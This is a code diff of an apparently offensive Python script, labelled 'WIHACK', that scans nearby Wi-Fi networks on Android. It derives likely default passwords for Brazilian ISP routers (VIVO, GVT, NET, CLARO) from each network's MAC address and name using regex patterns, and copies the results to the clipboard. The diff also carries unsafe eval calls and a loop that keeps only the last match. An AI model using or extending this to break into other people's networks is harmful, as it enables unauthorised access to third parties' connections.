@@ -1,153 +1,67 @@
 from tools.utils import edfile, reif, reg, cl
-from tools.design import read_int, menu_simples
+from tools.design import menu_simples, color
 
 try:
     import androidhelper
     droid = androidhelper.Android()
 except ImportError:
+
     try:
         import android
         droid = android.Android()
     except ImportError:
-        nets = edfile('wifiScanResults.txt')
-        nets = eval(nets)
-
-
-# Padrão usando apenas o mac
-
-def_bid = ['00:XX:XX:XX:XX:XX',
-           '00:00:XX:XX:XX:XX',
-           'xx:xx:xx:xx:xx:xx']
-
+        is_droid = False
+else:
+    is_droid = True
 
 # Padrao usando apenas o mac + nome
 
-def_eid = ['00:XX:XX:XX:00:00 VIVO-XXXX',
-           '00:xx:xx:00:00:xx VIVO-xxxx-0G',
-           '00:xx:xx:00:00:xx CLARO-xxxx-0G',
-           '00:XX:XX:XX:00:00 GVT-XXXX',
-           '00:00:XX:00:00:00 NET_0GXXXXXX',
-           '00:00:XX:00:00:00 CLARO_0GXXXXXX']
+def_eid = [['{mac.upper()} {name}', r'..:(..):(..):(..):..:.. (VIVO(FIBRA)?|GVT)-(\w+)', r'$1$2$3$6'],
+           ['{mac.upper()} {name}', r'..:..:(..):..:..:.. (NET|CLARO)_[25]G(\w+)', r'$1$3'],
+           ['{mac} {name}', r'..:(..):(..):..:..:(..) VIVO-(\w+)-[25]G', r'$1$2$4$3']]
 
 
 # Obtém informações das redes próximas 
 
 def scan_results():
-    if 'redes' not in locals():
+    if is_droid:
         while True:
             droid.wifiStartScan()
             nets = droid.wifiGetScanResults()
 
             if len(nets[1]) > 0:
-                return nets[1]
+                nets = nets[1]
+                break
+    else:
+        nets = edfile('wifiScanResults.txt')
+        nets = eval(nets)[1]
+
+    return nets
 
 
 # Copia texto
-clip = droid.setClipboard
+def clip(string):
+    droid.setClipboard(string)
 
 
 # Tenta obter a senha padrão com o mac + nome_da_rede
-def getkeys(bid, eid=None):
-    from re import sub
-    
-    global def_bid
-    global def_eid
-    
+def getkeys(mac, name):
     passwd = []
+    global def_eid
 
-    if eid is not None:
-        masker = def_eid
-        fakey = f'{bid} {eid}'
+    for mask in def_eid:
+        mask[0] = eval(f"f'{mask[0]}'")
+        key = reg(*mask)
 
-    else:        
-        masker = def_bid
-        fakey = bid
+        if mask[0] != key:
+            passwd = key
 
-    for index, mask in enumerate(masker):
-        
-        key = ''        
-        regex = reg(mask, r'[0Xx]', r'.')
-        
-        if reif(fakey, regex):
-            
-            for i, m in enumerate(mask):
-                if m == 'X':
-                    key += fakey[i].upper()
-            
-                elif m == 'x':
-                    key += fakey[i].lower()
-                    
-            passwd += [key]
-            
     return passwd
 
-
-def menu(*items):
-    print(f'\033[34;1m]{"-"*15}[\033[31mWIHACK\033[34m]\n')
-    for i, item in enumerate(items):
-        label = f'\033[1;31m[{i+1}]-\033[34m{item}\033[m'
-        
-        if not reif('\[|\]', item, 0):
-            label = f'\033[1;31m[{i+1}]-\033[34m[{item}]\033[m'
-            
-        print(label)
-        
-        
-    print()
-    while True:
-        op = read_int('>>> ')
-            
-        if 0 < op <= len(items):
-            break
-        else:
-            print('\033[1;31mTente novamente, digite um número entre as opções\033[m')
-    return op - 1
-
-
+getkeys('11:aa:bb:cc:EE:dd', 'VIVO-1234')
 # Programa Principal
 
-while True:
-    nets = scan_results()
-    
-    cl()
-    
-    list_nets = ['Rescan', 'Sair']
-
-    for net in nets:
-        eid = net['ssid']
-        sig = net['level']
-        
-    
-        list_nets.insert(0, f'\033[31m---------\033[34m[{sig}%]-[{eid}]')
-        
-        
-    op = menu(*list_nets)
-        
-    if list_nets[op] in 'Rescan':
-        continue
-        
-    elif list_nets[op] in 'Sair':
-        break
-        
-    bid = nets[op]['bssid']
-    eid = nets[op]['ssid']
-    
-    #bid = '11:22:33:44:55:66'
-    #eid = 'VIVO-1234'
-    
-    keys = getkeys(bid, eid)
-    
-    if len(keys) == 0:
-        keys = getkeys(bid)
-        
-    
-    keys.append('[Voltar]')
-        
-    while True:
-        cl()
-        opc = menu(*keys)
-        
-        if keys[opc] == '[Voltar]':
-            break
-        else:
-            clip(keys[opc])            
+# while True:
+#     for net in nets:
+#         eid = net['ssid']
+#         menu_simples( prompt='>>> ', mask=color(':n::vm:[{i}]--:az:[{r}]::'))
